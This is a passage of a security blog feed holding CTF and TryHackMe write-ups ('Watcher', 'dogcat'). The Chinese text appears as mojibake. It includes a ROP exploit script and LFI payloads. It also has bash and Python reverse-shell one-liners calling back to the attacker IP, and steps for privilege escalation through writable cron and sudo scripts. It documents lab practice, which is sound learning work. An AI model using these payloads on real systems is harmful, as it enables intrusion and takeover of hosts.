&quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x00000000040177B</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#‰∏éÈ¢òÁõÆÁõ∏Âêå‰ª•Êó∂Èó¥‰∏∫ÁßçÂ≠ê</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rl(&quot;lets move and pwn!&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(<span class="number">0x0004013EE</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">orw  = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(rdi) + p64(bss)  <span class="comment">#/flagÁöÑÂ≠óÁ¨¶‰∏≤‰ΩçÁΩÆÔºåË¶ÅÊîπ</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ</span></span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ</span></span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(len(orw)))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Âº∫ÁΩëÊãüÊÄÅ 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>THM-Watcher</title>
    <link href="https://www.fomal.cc/posts/837dcb87.html"/>
    <id>https://www.fomal.cc/posts/837dcb87.html</id>
    <published>2024-10-18T11:32:56.000Z</published>
    <updated>2024-10-27T12:35:53.554Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.76.81</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132502836-1887610598.png" alt="image-20241021132444064"></p><p>ÂèëÁé∞ÂºÄÊîæ21Ôºå22Ôºå80Á´ØÂè£</p><h2 id="21Á´ØÂè£">21Á´ØÂè£</h2><p>Â∞ùËØï‰∏Ä‰∏ãÂåøÂêçÁôªÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132601829-412050595.png" alt="image-20241021132544221"></p><p>ÂåøÂêçÁôªÈôÜÂ§±Ë¥•</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132647834-1011735877.png" alt="image-20241021132630028"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132809242-1024503247.png" alt="image-20241021132751518"></p><p>Èöè‰æøÁÇπÂáªÂêéÂèëÁé∞Âú®urlÂ§ÑÁñë‰ººÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´ÔºåÂ∞ùËØïÂà©Áî®‰∏Ä‰∏ã</p><p><code>/post.php?post=/etc/passwd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132848048-1949569944.png" alt="image-20241021132830423"></p><p>Ê≠§Â§ÑÁ°ÆÂÆûÂ≠òÂú®Êñá‰ª∂ÂåÖÂê´</p><p>ÂÜçÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133255264-514546742.png" alt="image-20241021133237741"></p><ul><li><code>robots.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133341367-1636037732.png" alt="image-20241021133323903"></p><p>ÊâæÂà∞‰ø©Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133429703-900456467.png" alt="image-20241021133412280"></p><p>ÂÖ∂‰∏≠‰∏Ä‰∏™ÊòØflag1</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133523610-110842426.png" alt="image-20241021133506063"></p><p>Âè¶‰∏Ä‰∏™Êó†Ê≥ïËÆøÈóÆÔºå‰ΩÜÊòØÂèØ‰ª•Áî®‰πãÂâçÂèëÁé∞ÁöÑÊñá‰ª∂ÂåÖÂê´ËØªÂèñÊñá‰ª∂</p><p><code>/post.php?post=secret_file_do_not_read.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133606595-1706470773.png" alt="image-20241021133549160"></p><p>ÂèëÁé∞Âè¶‰∏ÄÈáçË¶ÅÁõÆÂΩï<code>/home/ftpuser/ftp/files</code>ÔºåÂêåÊó∂ÊúÄÂêéÈù¢ÂÉèÊòØ‰∏ÄÁªÑÁî®Êà∑ÂêçÂØÜÁ†Å<code>ftpuser:givemefiles777</code>ÔºåÂÜçÊ¨°Â∞ùËØïÁôªÂΩïftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp ftpuser@10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134015974-2036326351.png" alt="image-20241021133958383"></p><p>ÁôªÈôÜÊàêÂäüÔºåÂπ∂ÊâæÂà∞flag2</p><p>ÂêåÊó∂filesÁõÆÂΩïÂ∞±ÊòØ‰πãÂâçÈÄöËøá‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊâæÂà∞ÁöÑÁõÆÂΩï</p><h1>Ëé∑ÂæóÂàùÂßãËÆøÈóÆÊùÉÈôê</h1><p>Êàë‰ª¨ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ãÔºåÈÄöËøáftp‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÊàë‰ª¨Áü•ÈÅìÂÖ∂ÁªùÂØπË∑ØÂæÑÔºåÂ∞±ÂèØ‰ª•ÈÄöËøáÊñá‰ª∂ËØªÂèñËøõË°åÂà©Áî®</p><p>ÂÖàÁÆÄÂçïÂ∞ùËØï‰∏Ä‰∏ãÔºåÂáÜÂ§á‰∏™phpÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134728595-1142287777.png" alt="image-20241021134710659"></p><p>ÈÄöËøáftp‰∏ä‰º†Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134741144-1604384591.png" alt="image-20241021134723674"></p><p>Ê≠§Êó∂Êñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑÂ∞±ÊòØ<code>/home/ftpuser/ftp/files/info.php</code></p><p>ÂÜçÈÄöËøáÊµèËßàÂô®ËØªÂèñËØ•Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134838040-1001287900.png" alt="image-20241021134820399"></p><p>ÊàêÂäüËØªÂèñÔºåÂêåÊó∂php‰ª£Á†Å‰πüÂèØ‰ª•Ë¢´Ëß£ÊûêÔºåÂèØ‰ª•Âà©Áî®Ëøô‰∏™ËøõË°åÂèçÂºπshell</p><p>ÂáÜÂ§áÂ•ΩÊàë‰ª¨ÁöÑ<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">webshell</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135028115-2037447420.png" alt="image-20241021135010474"></p><p>ËÆæÁΩÆÂ•ΩipÂíåport</p><p>Â∞ÜÊñá‰ª∂ÈÄöËøáftp‰∏ä‰º†Âà∞ÊúçÂä°Âô®‰∏ä</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135329563-557176968.png" alt="image-20241021135312126"></p><p>ÊîªÂáªÊú∫ËÆæÁΩÆÂ•ΩÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135347617-1267050085.png" alt="image-20241021135330242"></p><p>ÊµèËßàÂô®ËØªÂèñÂπ∂ËÆøÈóÆÊàë‰ª¨ÁöÑshellÊñá‰ª∂</p><p><code>/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135440557-392731814.png" alt="image-20241021135423056"></p><p>ÊãøÂà∞shell</p><h1>‰∏ªÊú∫Áî®Êà∑‰ø°ÊÅØÊî∂ÈõÜ</h1><p>Êàë‰ª¨Â∑≤ÁªèËé∑Âæó‰∫Ü<code>www-data</code>ÊùÉÈôêÔºåËÉΩÂ§üÁÆÄÂçïÁöÑËÆøÈóÆÊúçÂä°Âô®ËµÑÊ∫êÔºåÊàë‰ª¨ÈúÄË¶ÅÊõ¥Ëøõ‰∏ÄÊ≠•ÁöÑÊéßÂà∂ËøôÂè∞ÊúçÂä°Âô®ÔºåÂ∞±ÈúÄË¶ÅÁªßÁª≠ÊèêÂçáÊàë‰ª¨ÁöÑÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135929107-235560157.png" alt="image-20241021135911555"></p><p>Âú®<code>/home/mat</code>‰∏ãÔºåÊâæÂà∞flag5Ôºå‰ΩÜÊòØÊùÉÈôê‰∏çÂ§üÊó†Ê≥ïËÆøÈóÆÔºå‰ΩÜÊòØÂèØ‰ª•Êü•Áúã<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140040335-1570935829.png" alt="image-20241021140022894"></p><p>ÂèëÁé∞ÂèØ‰ª•‰ΩøÁî®ËÑöÊú¨ÊâßË°åÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140152087-852207533.png" alt="image-20241021140134588"></p><p>ÂÖàÂàáÊç¢Âà∞‰∫§‰∫íÂºèshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>ÂèëÁé∞ËØ•Êñá‰ª∂Âè™Êèê‰æõ‰∫Ü‰∏â‰∏™ÂèØ‰ª•ÊâßË°åÁöÑÂëΩ‰ª§ÔºåÂõ†‰∏∫Êñá‰ª∂ÊâÄÂ±ûÊùÉ‰∏çÂ±û‰∫éÂΩìÂâçÁî®Êà∑ÔºåÊâÄ‰ª•Êó†Ê≥ïÊõ¥ÊîπÔºåÁúã‰∏ãÂÖ∂‰ªñÁî®Êà∑ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140642766-1756489674.png" alt="image-20241021140625275"></p><p>ËøòÊúâ‰∏™<code>note.txt</code>ÔºåÊü•Áúã‰∏Ä‰∏ãÔºå<code>flag4</code>ËøòÊòØÊ≤°ÊùÉÈôêÊü•ÁúãÔºåÂêåÊó∂ËøòÊ≥®ÊÑèÂà∞Êúâ‰∏™<code>jobs</code>ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141248050-1048480932.png" alt="image-20241021141230381"></p><p>ÁúãÊ†∑Â≠êÊòØÊÉ≥ÊèêÈÜíÊàë‰ª¨Êü•Áúã<code>jobs</code>ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141331204-1164871302.png" alt="image-20241021141313651"></p><p>ËøôÊòØ‰∏Ä‰∏™ËÑöÊú¨Êñá‰ª∂ÔºåÈáåÈù¢ÊúâcatÂëΩ‰ª§</p><p>ÁªßÁª≠Êü•ÁúãÊúÄÂêé‰∏Ä‰∏™Áî®Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141428606-130895387.png" alt="image-20241021141411017"></p><p>ËøôÈáåÂè™Êúâflag6Ôºå‰ªçÁÑ∂Êó†ÊùÉÈôêËØªÂèñ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141806989-1106969102.png" alt="image-20241021141749594"></p><p>Âú®webÁõÆÂΩï‰∏ãÊâæÂà∞flag3</p><h1>ÊèêÂçáËá≥userÊùÉÈôê</h1><h2 id="ÊèêÂçáËá≥tobyÊùÉÈôê">ÊèêÂçáËá≥tobyÊùÉÈôê</h2><p>ÂÖàÊ£ÄÊü•‰∏ã<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144652253-1150780171.png" alt="image-20241021144634735"></p><p>ÂèëÁé∞ÂèØ‰ª•‰ΩøÁî®<code>toby</code>ÊâßË°å‰ªª‰ΩïÂëΩ‰ª§<code>sudo</code>Êó†ÈúÄÂØÜÁ†Å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144827096-1301873310.png" alt="image-20241021144809623"></p><p>Ëé∑Âèñ<code>toby</code>Áî®Êà∑ÊùÉÈôêÔºåÂπ∂ÊãøÂà∞flag4</p><h2 id="Ê®™ÁßªËá≥matÊùÉÈôê">Ê®™ÁßªËá≥matÊùÉÈôê</h2><p>ÁªìÂêà‰πãÂâçÁöÑ‰ø°ÊÅØÂèØÁü•tobyÁöÑ<code>jobs</code>ÁõÆÂΩï‰∏≠<code>cow.sh</code>ÊòØmatÁöÑÔºåËÄåÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπËØ•Êñá‰ª∂ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂÜôÂèçÂºπshellËé∑ÂèñmatÁöÑÊùÉÈôê</p><p>ÊîªÂáªÊú∫ÂÖàËÆæÁΩÆÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145651665-600001604.png" alt="image-20241021145634230"></p><p>Âú®Èù∂Êú∫‰∏≠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; cow.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145821073-1468765908.png" alt="image-20241021145803589"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150121987-290344974.png" alt="image-20241021150104300"></p><p>Ëøá‰∏Ä‰ºöÁ≠âÂÆöÊó∂‰ªªÂä°Ëß¶ÂèëÔºåÂ∞±ÊãøÂà∞‰∫ÜmatÁöÑshellÔºåÂπ∂Âú®ÂΩìÂâçÁõÆÂΩïÊâæÂà∞flag5</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150554982-1695743786.png" alt="image-20241021150537504"></p><h2 id="Ê®™ÁßªËá≥willÊùÉÈôê">Ê®™ÁßªËá≥willÊùÉÈôê</h2><p>Áé∞Âú®Â∑≤ÁªèÊãøÂà∞‰∫ÜmatÁöÑÊùÉÈôêÔºåÊü•Áúã‰∏Ä‰∏ã<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151156011-979402750.png" alt="image-20241021151138536"></p><p>ÂèëÁé∞Êàë‰ª¨ÂèØ‰ª•‰∏çÁî®ÂØÜÁ†ÅÊâßË°å<code>will</code>ÊùÉÈôêÁöÑ<code>python3</code>ÂëΩ‰ª§</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151729954-690550907.png" alt="image-20241021151707919"></p><p>ÁªìÂêà‰πãÂâçÂàÜÊûêÁöÑÁªìÊûúÂèØÁü•ÔºåÊàë‰ª¨ÊúâÊùÉ‰øÆÊîπ<code>cmd.py</code>ÔºåÊó†ÊùÉÊõ¥Êîπ<code>will_script.py</code>Ôºå‰ΩÜÊòØ<code>will_script.py</code>‰ºöË∞ÉÁî®<code>cmd.py</code>ÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá‰øÆÊîπ<code>cmd.py</code>ÁöÑÂÜÖÂÆπÔºåÂú®ÂÖ∂‰∏≠ÂÜô‰∏äÂèçÂºπshellÁöÑpython‰ª£Á†ÅÔºå‰ΩøÁî®<code>will</code>ÊùÉÈôêÁöÑ<code>python3</code>ÊâßË°å<code>will_script.py</code>ÔºåÊàë‰ª¨Â∞±Ëé∑Âæó‰∫Ü<code>will</code>ÁöÑshell</p><p>ÂÖàÂú®kali‰∏äËÆæÁΩÆÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152055316-382361973.png" alt="image-20241021152037707"></p><p>Âú®Èù∂Êú∫‰∏äÂÜôÂÖ•python‰ª£Á†Å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.14.90.122&quot;,8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; cmd.py</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152258357-765071767.png" alt="image-20241021152240564"></p><p>ÊâßË°å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152345593-107476696.png" alt="image-20241021152328180"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152358318-1138667333.png" alt="image-20241021152340822"></p><p>Ëé∑ÂæówillÁöÑshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152454277-1738449844.png" alt="image-20241021152436836"></p><p>ÊâæÂà∞flag6</p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>‰ΩøÁî®willÁªßÁª≠Êü•ÊâæÊïèÊÑüÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152856987-194567056.png" alt="image-20241021152839278"></p><p>Âú®<code>/opt/backups</code>‰∏ãÊâæÂà∞‰∫ÜÁªèËøá<code>base64</code>ÁºñÁ†ÅÁöÑkey</p><p>Â∞ÜÂÖ∂‰øùÂ≠òÂà∞Êñá‰ª∂<code>base64_key</code>Ëß£Á†ÅÊü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153053351-1239828122.png" alt="image-20241021153035699"></p><p>ÂèëÁé∞ÊòØ‰∏ÄÁªÑÁßÅÈí•ÔºåÁåúÊµãÊòØrootÁöÑÔºåÂ∞ÜÁßÅÈí•‰øùÂ≠òÂà∞Êñá‰ª∂<code>id_rsa</code>ÔºåÂπ∂Ëµã‰∫à<code>600</code>ÊùÉÈôê‰æø‰∫ésshËøûÊé•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.76.81 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153454825-905657572.png" alt="image-20241021153436661"></p><p>Ëé∑ÂæórootÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153518635-300441644.png" alt="image-20241021153501169"></p><p>Âú®ÂΩìÂâçÁõÆÂΩïÊâæÂà∞ÊúÄÂêé‰∏Ä‰∏™flag7</p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãWatcher</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-dogcat</title>
    <link href="https://www.fomal.cc/posts/652498eb.html"/>
    <id>https://www.fomal.cc/posts/652498eb.html</id>
    <published>2024-10-18T06:52:51.000Z</published>
    <updated>2024-10-27T12:35:39.155Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.89.86</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160045039-313432027.png" alt="image-20241018160031179"></p><p>ÂèëÁé∞ÂºÄÊîæ22Ôºå80Á´ØÂè£</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018152418808-1060650834.png" alt="image-20241018152404974"></p><p>ÂèëÁé∞ÁÇπÂáªdogÊàñËÄÖcatÔºå‰ºöÊòæÁ§∫‰∏ÄÂº†Áõ∏Â∫îÁöÑÂõæÁâá</p><p>ÂÖàÊâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018160059374-298481108.png" alt="image-20241018160045419"></p><p>ËÆøÈóÆ<code>/cats</code>ÊòæÁ§∫403ÔºåÈô§Ê≠§‰πãÂ§ñÂπ∂Ê≤°Êúâ‰ªÄ‰πàÊúâÁî®ÁöÑ‰ø°ÊÅØ</p><h1>LIFÂØºËá¥RCE</h1><p>ÂÜçÊ¨°Êü•ÁúãÊàë‰ª¨ÁöÑÈ°µÈù¢</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161701177-2088714964.png" alt="image-20241018161647388"></p><p>Âú®urlÂ§ÑÊúâ‰∏™ÂèÇÊï∞viewÔºåÂ∞ùËØï‰∏Ä‰∏ãÁõÆÂΩïÁ©øË∂ä</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161810480-951159654.png" alt="image-20241018161756644"></p><p>ÊúâÊïàÊûúÔºåÂèØ‰ª•Êñá‰ª∂ÂåÖÂê´ÔºåÂπ∂‰∏îÈªòËÆ§Âú®ÂêéÈù¢Âä†<code>.php</code>Êñá‰ª∂ÂêéÁºÄ‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018161932049-1336654229.png" alt="image-20241018161918408"></p><p>ÊµãËØïÂêéÂèëÁé∞ÂèØ‰ª•ÈÄöËøá<code>%00</code>ÂèØ‰ª•Êà™Êñ≠</p><p>‰ΩøÁî®‰º™ÂçèËÆÆÂ∞ùËØïËØªÂèñÊ∫êÁ†Å</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162225948-1416006650.png" alt="image-20241018162212286"></p><p>base64Ëß£Á†Å‰∏Ä‰∏ã</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162330439-314328065.png" alt="image-20241018162316656"></p><p>Â∞ùËØïËØªÂèñ‰∏Ä‰∏ãÂà´ÁöÑÊñá‰ª∂</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=php://filter/convert.base64-encode/resource=dog/../index</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162600495-2121576637.png" alt="image-20241018162546442"></p><p>ÂèëÁé∞Ëß£Á†ÅÂêéÁöÑ‰ª£Á†ÅÔºåÊàë‰ª¨ËøòÂèØ‰ª•ÊéßÂà∂<code>ext</code>ÂèòÈáèÔºåÊù•ÊéßÂà∂Êñá‰ª∂ÂêéÁºÄÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±ÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂‰∫Ü</p><p>ÂÖàËØªÂèñ<code>/etc/passwd</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../etc/passwd&amp;ext=</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018162851221-1049120622.png" 